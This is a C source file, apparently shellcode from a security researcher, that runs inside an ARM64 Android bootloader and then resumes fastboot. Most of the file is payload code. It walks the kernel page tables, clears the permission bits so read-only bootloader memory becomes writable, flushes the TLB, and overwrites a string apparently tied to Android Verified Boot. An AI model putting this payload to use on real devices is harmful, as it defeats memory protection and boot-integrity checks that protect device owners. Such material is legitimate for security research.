#include <stdarg.h>

#include "bl_210817.h"

void set_page_writable(vaddr_t vaddr);
void set_page_executable(vaddr_t vaddr);
void test_write();
pte_t * get_pte(arch_aspace_t *aspace, vaddr_t vaddr);


void test_write(){
	//Try to read value from R/O memory
	printf("R/O str [%s]\n",external_lib_avb_str);

	set_page_writable((vaddr_t)external_lib_avb_str);

	char * str = "eshard";
	memmove(external_lib_avb_str,str,sizeof(str));
	printf("R/O str [%s]\n",external_lib_avb_str);
}

void print_banner(){
	printf("         ***\n");
	printf("       ***\n");
	printf("      **\n");
	printf("     *          *         ********                    **\n");
	printf("    **      *****         ***** ***                  ***\n");
	printf("    *    *******    ****  ***   ****** ****  **** ******\n");
	printf("    *  ****** *    ******  **** ****** ***** ***********\n");
	printf("           ** *    ******    ****** ***********  **  ***\n");
	printf("            **     ****** ** ****** ***** *****  *** ***\n");
	printf("            **      ***** ***** *** ***********   ******\n");
	printf("            *\n");

}

void set_page_writable(vaddr_t vaddr)
{
	pte_t *	pte_addr = get_pte(&kernel_aspace,vaddr);
	LTRACEF("pte: %llx\n",*pte_addr);
	*pte_addr = *pte_addr & ~MMU_PTE_ATTR_AP_MASK;
	LTRACEF("pte: %llx\n",*pte_addr);
	ARM64_TLBI(vaae1is, vaddr >> 12);
	ISB;
	DSB;
}

static inline bool is_valid_vaddr(arch_aspace_t *aspace, vaddr_t vaddr) {
     return (vaddr >= aspace->base && vaddr <= aspace->base + aspace->size - 1);
}


pte_t * get_pte(arch_aspace_t *aspace, vaddr_t vaddr) {
    uint index;
    uint index_shift;
    uint page_size_shift;
    pte_t pte;
    pte_t *ppte;
    pte_t pte_addr;
    uint descriptor_type;
    pte_t *page_table;
    vaddr_t vaddr_rem;

    LTRACEF("aspace %p, vaddr 0x%lx\n", aspace, vaddr);

    DEBUG_ASSERT(aspace);
    DEBUG_ASSERT(aspace->tt_virt);

    DEBUG_ASSERT(is_valid_vaddr(aspace, vaddr));
    if (!is_valid_vaddr(aspace, vaddr))
        return 0;

    /* compute shift values based on if this address space is for kernel or user space */
    if (aspace->flags & ARCH_ASPACE_FLAG_KERNEL) {
        index_shift = MMU_KERNEL_TOP_SHIFT;
        page_size_shift = MMU_KERNEL_PAGE_SIZE_SHIFT;

        vaddr_t kernel_base = ~0UL << MMU_KERNEL_SIZE_SHIFT;
        vaddr_rem = vaddr - kernel_base;

        index = vaddr_rem >> index_shift;
	LTRACEF("kernel_base=%llx vaddr_rem =%llx index=%llx index_shift=%llx\n",kernel_base,vaddr_rem,index,index_shift);
        ASSERT(index < MMU_KERNEL_PAGE_TABLE_ENTRIES_TOP);
    } else {
        index_shift = MMU_USER_TOP_SHIFT;
        page_size_shift = MMU_USER_PAGE_SIZE_SHIFT;

        vaddr_rem = vaddr;
        index = vaddr_rem >> index_shift;
	LTRACEF("2vaddr_rem =%llx index=%llx\n index_shift=%llx\n",vaddr_rem,index,index_shift);
        ASSERT(index < MMU_USER_PAGE_TABLE_ENTRIES_TOP);
    }

    page_table = aspace->tt_virt;

    while (true) {
        index = vaddr_rem >> index_shift;
        vaddr_rem -= (vaddr_t)index << index_shift;
	ppte = &page_table[index];
        pte = page_table[index];
        descriptor_type = pte & MMU_PTE_DESCRIPTOR_MASK;
        pte_addr = pte & MMU_PTE_OUTPUT_ADDR_MASK;

        LTRACEF("va 0x%lx, index %d, index_shift %d, rem 0x%lx, pte 0x%llx ppte 0x%llp\n",
                vaddr, index, index_shift, vaddr_rem, pte, ppte);

        if (descriptor_type == MMU_PTE_DESCRIPTOR_INVALID)
            return 0;

        if (descriptor_type == ((index_shift > page_size_shift) ?
                                MMU_PTE_L012_DESCRIPTOR_BLOCK :
                                MMU_PTE_L3_DESCRIPTOR_PAGE)) {
            break;
        }

        if (index_shift <= page_size_shift ||
                descriptor_type != MMU_PTE_L012_DESCRIPTOR_TABLE) {
            PANIC_UNIMPLEMENTED;
        }
        
	page_table = (pte_t*)paddr_to_kvaddr(pte_addr);
        index_shift -= page_size_shift - 3;
    }

    LTRACEF("pte: %llp %llx ppte:%llp\n",&pte,pte,ppte);
    return ppte;
}

int SHELLCODE_MAIN shellcode(){
	int res;
	print_banner();

	test_write();

	res=fastboot_run(&fastboot_stop,fastboot_activity_cb);
	printf("res: %d\n",res);
	return 0;
}

